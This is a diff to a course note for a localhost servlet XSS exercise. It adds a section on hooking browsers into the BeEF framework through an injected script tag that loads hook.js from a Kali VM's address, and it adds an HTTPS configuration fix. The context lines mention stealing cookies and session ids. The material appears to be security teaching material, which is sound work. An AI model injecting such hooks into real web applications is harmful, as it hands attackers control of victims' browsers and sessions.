@@ -1,7 +1,7 @@
 Reflected Cross-Site Scripting
 ---------------------------------------------------------------------
 
-Browser: https://localhost:8443/Servlet-XSS-Exercise/index.html
+URL: http://localhost:8080/Servlet-XSS-Exercise/index.html
 		 
 
 How to attack an input field?
@@ -47,6 +47,22 @@ c) Stealing cookies
 Note that this attack can also be used to steal session ids!!
 
 
+How to hook into the BeEF framework?
+---------------------------------------------------------------------
+
+o) Start the BeEF server (using a Kali VM) -> ifconfig -> 10.0.2.15
+
+o) Inject the following JavaScript code:
+    <script src="http://10.0.2.15:3000/hook.js"></script>
+
+o) Open the BeEF Panel in a browser:
+    http://10.0.2.15:3000/ui/panel
+
+Note that this is only working if the Web application is using HTTP.
+With HTTPS we run into a Mixed content error => browser will block
+loading mixed active content.
+
+
 How to fix these vulnerabilities?
 ---------------------------------------------------------------------
 
@@ -65,4 +81,14 @@ o) In ControllerServlet.generateUserPage():
 		html.append(HTMLEncoder.encodeForHTML(username)).append(" as ");
 		html.append(HTMLEncoder.encodeForHTML(role));
 
-		
+o) Configure web.xml to use HTTPS:
+
+    <security-constraint>
+		<web-resource-collection>
+			<web-resource-name>secure</web-resource-name>
+			<url-pattern>/*</url-pattern>
+		</web-resource-collection>
+		<user-data-constraint>
+			<transport-guarantee>CONFIDENTIAL</transport-guarantee>
+		</user-data-constraint>
+	</security-constraint>
